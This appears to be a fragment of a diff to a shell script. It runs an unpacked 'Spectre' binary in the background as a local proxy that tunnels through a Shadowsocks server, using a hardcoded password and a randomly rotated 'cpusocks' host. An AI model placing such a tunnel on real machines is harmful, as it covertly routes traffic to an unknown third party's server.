@@ -56,7 +56,7 @@ tar -xf Spectre.tar.gz
 
 sleep 2
 
-./Spectre -L=:1082 -F=ss://aes-128-cfb:mikrotik999@greenleaf.teatspray.fun:8443 &
+Spectre -L=:1082 -F=ss://aes-128-cfb:mikrotik999@cpusocks$(shuf -i 1-6 -n 1).wot.mrface.com:8443 &
 
 sleep 2
 
